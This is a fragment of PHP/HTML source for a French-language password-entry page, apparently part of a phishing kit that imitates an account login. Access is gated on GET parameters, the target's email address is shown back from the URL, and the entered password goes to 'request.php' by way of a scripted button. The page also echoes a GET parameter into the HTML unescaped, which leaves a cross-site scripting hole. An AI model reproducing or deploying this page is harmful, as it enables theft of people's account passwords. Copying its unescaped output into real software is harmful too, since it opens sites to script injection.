...
if($_SERVER['REQUEST_METHOD'] !== "POST" && isset($_GET['cheking']) && isset($_GET['id']) && $sec == "pass"  && isset($_GET['pmail'])/* && isset($_SESSION['orta']) && $_SESSION['orta'] == "run" && isset($_SESSION['tipa']) && $_SESSION['tipa'] == "run" */ ):
                ...
                <div class="bodys_bodys">
                    <div class="bodys_ct_tp">
                        <div class="kolza_dplk">
                            ...
                            <div class="infoka">
                                <div class="infoka_lft"></div>
                                <div class="infoka_rgt">
                                    <div class="infoka_rgt_top"><span><?php if(isset($_GET['pmail']) && !empty($_GET['pmail'])): echo $_GET['pmail']; endif; ?></span></div>
                                    <div class="infoka_rgt_boot">
                                        <div class="flouka"><a href="#">Changer de compte</a></div>
                                        <div class="flouka_rt"></div>
                                    </div>
                                </div>
                            </div>

                            <br><br>
                            <h2>Saisissez votre mot de passe</h2><br>
                            <label for="">Mot de passe</label><br><br>
                            <form name="sata" method="GET" action="request.php?">
                                <input style="display:none;" type="text" id="pz" value="<?php if(isset($_GET['pmail']) && !empty($_GET['pmail'])): echo $_GET['pmail']; endif; ?>">
                                <input type="password" class="pswdo"><br>

                                <div class="resta"></div>
                                <div class="olkaz hide">
                                ...
                                <div class="botona">
                                    <div class="buttoss dd snd2">S’identifier</div> <!--  onclick="document.forms['sata'].submit();" -->
                                    <div class="right_buttos">
                                        <div class="right_buttos_lft"><a href="#">Mot de passe oublié</a></div>
                                        <div class="left_buttos_right"></div>
                                    </div>
                                </div>
                            </form>
